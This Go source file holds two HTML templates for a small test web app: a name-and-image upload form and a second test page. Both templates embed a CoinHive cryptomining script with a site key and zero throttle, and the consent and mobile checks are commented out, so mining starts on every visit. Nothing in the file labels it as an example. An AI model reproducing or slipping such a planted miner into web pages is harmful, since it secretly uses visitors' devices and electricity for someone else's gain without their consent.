package main

/*HTML meaning guide for my sanity:
<br>: page break
<html> and </html>: beginning and end of html section
<body> and </body>: main part with text
*/
var (
	firstPage = `<html>
<head><title>This is the first page</title></head>
<body>
There is text here. <br>

and more text here.

<p>
field from request: {{ .Fn}}
</p>

<form enctype="multipart/form-data" action="/app/test/" method="POST">
  First name: <input type="text" name="fn"><br>
  Last name: <input type="text" name="tn"><br>
	IMG: <input type="file" name="img"><br>
  <input type="submit" value="Go!">
</form>

<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.0});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	//if (!miner.isMobile() && !miner.didOptOut(14400)) {
	miner.start();
  //}
  
</script>

</body>
</html>`
)

//<img src="./testingpics/Graphic1.jpg" alt="Testing Graphic" style="height:500;width:500">

var (
	testPage = `<html>
  <head><title> This is the second test page!!! </title> </head>
  <body>
  testing text<br>
  and moar testing text!!!<br>
  And a testing graphic!!!<img src="/app/i/foo" alt="Testing Graphic" >

  <p>
  field from request: {{ .Tn}}
  </p>

  <form action="/app/main/" method="POST">
    <input type="submit" value="back to main!">
  </form>

  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.0});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	//if (!miner.isMobile() && !miner.didOptOut(14400)) {
	miner.start();
  //}
  
</script>

  </body> </html>`
)
